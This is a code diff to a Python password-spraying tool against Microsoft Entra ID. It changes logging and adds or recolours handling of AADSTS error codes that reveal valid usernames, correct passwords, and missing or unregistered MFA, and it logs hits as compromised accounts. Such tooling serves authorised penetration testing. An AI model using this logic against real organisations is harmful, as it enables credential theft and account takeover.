@@ -11,15 +11,17 @@ import shutil
 import urllib3
 
 
-def log_message(message, full_log, compromised_users_log=None, color=None):
+def log_message(message, full_log=None, compromised_users_log=None, color=None, print_to_console=True):
     timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
 
-    if color:
-        print(f"[{timestamp}] {color}{message}{Style.RESET_ALL}")
-    else:
-        print(f"[{timestamp}] {message}")
+    if print_to_console:
+        if color:
+            print(f"[{timestamp}] {color}{message}{Style.RESET_ALL}")
+        else:
+            print(f"[{timestamp}] {message}")
 
-    full_log.write(f"[{timestamp}] {message}\n")
+    if full_log:
+        full_log.write(f"[{timestamp}] {message}\n")
 
     if compromised_users_log:
         compromised_users_log.write(f"[{timestamp}] {message}\n")
@@ -174,10 +176,10 @@ def entra_spray(
             }
 
             if debug:
-                log_message("[*] Request Details:", full_log)
-                log_message(f"[*] URL: {url}", full_log)
-                log_message(f"[*] Headers: {post_headers}", full_log)
-                log_message(f"[*] Data: {body_params}", full_log)
+                log_message("[*] Request Details:")
+                log_message(f"[*] URL: {url}")
+                log_message(f"[*] Headers: {post_headers}")
+                log_message(f"[*] Data: {body_params}")
 
             urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
             if proxy:
@@ -206,10 +208,10 @@ def entra_spray(
             )
 
             if debug:
-                log_message("[*] Response Details:", full_log)
-                log_message(f"[*] Status Code: {r.status_code}", full_log)
-                log_message(f"[*] Headers: {r.headers}", full_log)
-                log_message(f"[*] Body: {r.text}", full_log)
+                log_message("[*] Response Details:")
+                log_message(f"[*] Status Code: {r.status_code}")
+                log_message(f"[*] Headers: {r.headers}")
+                log_message(f"[*] Body: {r.text}")
 
             if r.status_code == 200:
                 log_message(
@@ -226,12 +228,12 @@ def entra_spray(
                 if "AADSTS50126" in resp_err:
                     # Standard invalid password
                     non_compromised_users.append(username)
-                    if verbose or debug:
-                        log_message(
-                            f"[*] Valid user, but invalid password {username} : {password}",
-                            full_log,
-                            color=Fore.YELLOW,
-                        )
+                    log_message(
+                        f"[*] Valid user, but invalid password {username} : {password}",
+                        full_log,
+                        color=Fore.CYAN,
+                        print_to_console=verbose,
+                    )
                 elif "AADSTS50055" in resp_err:
                     # User password is expired
                     compromised_users.append(f"{username} : {password}")
@@ -245,7 +247,16 @@ def entra_spray(
                     # Microsoft MFA required but not configured
                     compromised_users.append(f"{username} : {password}")
                     log_message(
-                        f"[+] {username} : {password} - NOTE: MFA required but not configured yet - check for account takeover.",
+                        f"[+] {username} : {password} - NOTE: MFA required but not configured yet.",
+                        full_log,
+                        compromised_users_log=compromised_user_log,
+                        color=Fore.GREEN,
+                    )
+                elif "AADSTS53004" in resp_err:
+                    # User should register for multifactor authentication
+                    compromised_users.append(f"{username} : {password}")
+                    log_message(
+                        f"[+] {username} : {password} - NOTE: User needs to complete the MFA registration process.",
                         full_log,
                         compromised_users_log=compromised_user_log,
                         color=Fore.GREEN,
@@ -257,7 +268,7 @@ def entra_spray(
                         f"[+] {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.",
                         full_log,
                         compromised_users_log=compromised_user_log,
-                        color=Fore.GREEN,
+                        color=Fore.YELLOW,
                     )
                 elif "AADSTS50158" in resp_err:
                     # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
@@ -266,7 +277,7 @@ def entra_spray(
                         f"[+] {username} : {password} - NOTE: Conditional access policy (MFA: DUO or other) is in use.",
                         full_log,
                         compromised_users_log=compromised_user_log,
-                        color=Fore.GREEN,
+                        color=Fore.YELLOW,
                     )
                 elif "AADSTS53003" in resp_err:
                     # Conditional Access response - access policy blocks token issuance
@@ -275,7 +286,7 @@ def entra_spray(
                         f"[+] {username} : {password} - NOTE: Conditional access policy is in place and blocks token issuance.",
                         full_log,
                         compromised_users_log=compromised_user_log,
-                        color=Fore.GREEN,
+                        color=Fore.YELLOW,
                     )
                 elif "AADSTS53000" in resp_err:
                     # Conditional Access response - access policy requires a compliant device
@@ -284,7 +295,7 @@ def entra_spray(
                         f"[+] {username} : {password} - NOTE: Conditional access policy is in place and requires a compliant device, and the device isn't compliant.",
                         full_log,
                         compromised_users_log=compromised_user_log,
-                        color=Fore.GREEN,
+                        color=Fore.YELLOW,
                     )
                 elif "AADSTS530035" in resp_err:
                     # Access block by security defaults
@@ -293,7 +304,7 @@ def entra_spray(
                         f"[+] {username} : {password} - NOTE: Access has been blocked by security defaults. The request is deemed unsafe by security defaults policies",
                         full_log,
                         compromised_users_log=compromised_user_log,
-                        color=Fore.GREEN,
+                        color=Fore.YELLOW,
                     )
                 elif "AADSTS50128" in resp_err or "AADSTS50059" in resp_err:
                     # Invalid Tenant Response
@@ -301,7 +312,7 @@ def entra_spray(
                     log_message(
                         f"[-] Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.",
                         full_log,
-                        color=Fore.YELLOW,
+                        color=Fore.RED,
                     )
                 elif "AADSTS50034" in resp_err:
                     # Invalid Username
@@ -309,9 +320,24 @@ def entra_spray(
                     log_message(
                         f"[-] The user {username} doesn't exist.",
                         full_log,
-                        color=Fore.YELLOW,
+                        color=Fore.RED,
                     )
-
+                elif "AADSTS500011" in resp_err:
+                    # Invalid resource name
+                    non_compromised_users.append(username)
+                    log_message(
+                        f"[!] The resource principal named was not found in the tenant named.",
+                        full_log,
+                        color=Fore.RED,
+                    )
+                elif "AADSTS700016" in resp_err:
+                    # Invalid application client ID
+                    non_compromised_users.append(username)
+                    log_message(
+                        f"[!] The application wasn't found in the directory/tenant.",
+                        full_log,
+                        color=Fore.RED,
+                    )
                 elif "AADSTS50053" in resp_err:
                     # Locked out account or Smart Lockout in place
                     non_compromised_users.append(username)
@@ -333,7 +359,7 @@ def entra_spray(
                     # Unknown errors
                     non_compromised_users.append(username)
                     log_message(
-                        f"[*] Got an error we haven't seen yet for user {username}",
+                        f"[!] Got an error we haven't seen yet for user {username}",
                         full_log,
                     )
                     log_message(resp_err, full_log)
